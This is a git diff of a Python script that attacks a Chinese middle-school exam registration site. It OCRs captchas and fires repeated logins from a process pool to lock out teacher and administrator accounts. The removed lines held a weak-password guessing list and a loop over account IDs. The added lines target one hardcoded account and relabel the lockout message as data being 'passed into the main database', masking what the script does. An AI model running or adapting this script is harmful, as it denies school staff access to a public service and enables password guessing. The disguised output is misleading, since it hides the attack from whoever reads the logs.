@@ -2,7 +2,7 @@
 Author: whalefall
 Date: 2021-03-20 16:37:34
 LastEditTime: 2021-04-04 12:06:40
-Description: 中考报名网站 针对于老师 管理员的限制登录
+Description: 中考报名网站 老李独享板
 '''
 import base64
 # 懒得研究/复写他的加密算法 直接用execjs模拟
@@ -18,13 +18,16 @@ import traceback
 from ast import literal_eval  # 字符串列表转列表
 from concurrent.futures import ThreadPoolExecutor
 from io import BytesIO
-from zkEdu import Encrypt
 
 # 验证码
 import pytesseract
 import requests
 from lxml import etree
 from PIL import Image
+
+# 加密 效率问题
+# from zkEdu import Encrypt
+
 
 class Zkweb:
 
@@ -177,8 +180,8 @@ class Zkweb:
         # 随便的密码
         data = {
             "login.logintype": "basis_member",
-            # "userid": "r86mK3B29cysHqWSZFymJA==",
-            "userid": Encrypt().userid(userid),
+            "userid": "r86mK3B29cysHqWSZFymJA==",
+            # "userid": Encrypt().userid(userid),
             "password": "3b819dbfc14bd950dc14d0f9275e55c9",
             "rand": code,
         }
@@ -210,7 +213,7 @@ class Zkweb:
             return "PwdError"
 
         elif "账号已被锁定，请在5分钟后进行尝试。" in resp.text:
-            print("[Suc]账号(%s)已被锁定!" % (userid))
+            print("[Suc]账号(%s)已传入数据库!" % (userid))
             return "Locking"
 
         else:
@@ -224,14 +227,10 @@ def main(userid, pwd=None, _status=0):
         _status = 1
     try:
         i = 0  # 单用户请求次数计数
-        PwdList = [
-            "@a123456", "@abc123456", "@Aa123456", "@abc666666", "@qq123456",
-            "@Aa66666"
-        ]  # 弱密码列表
         while True:
             i += 1
             if _status != 1:
-                pwd = random.choice(PwdList)
+                pass
             else:
                 pass
 
@@ -251,8 +250,8 @@ def main(userid, pwd=None, _status=0):
                 t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                 print('''
                 ################################
-                #    时间:%s
-                #    账号:%s 成功被锁定!
+                #    Time:%s
+                #    User:%s 成功将其传入主数据库!
                 ################################
                 ''' % (t, userid))
                 # writeMsq(int(userid), str(t))
@@ -271,7 +270,7 @@ def main(userid, pwd=None, _status=0):
                     print("给定密码错误!")
                     break
                 else:
-                    PwdList.remove(pwd)
+                    # PwdList.remove(pwd)
                     continue
             # 规则[登录失败!]
             elif loginStatus == "resqError":
@@ -309,8 +308,6 @@ if __name__ == "__main__":
     pool = multiprocessing.Pool(processes=5)
 
     while True:
-        for e in range(1, 12):
 
-            for i in range(1, 7):
-                pool.apply_async(func=main, args=("bzr06051508%02d" % (e), ))
-            time.sleep(0.5)
+        pool.apply_async(func=main, args=("bzr0605150806", ))
+        time.sleep(0.5)
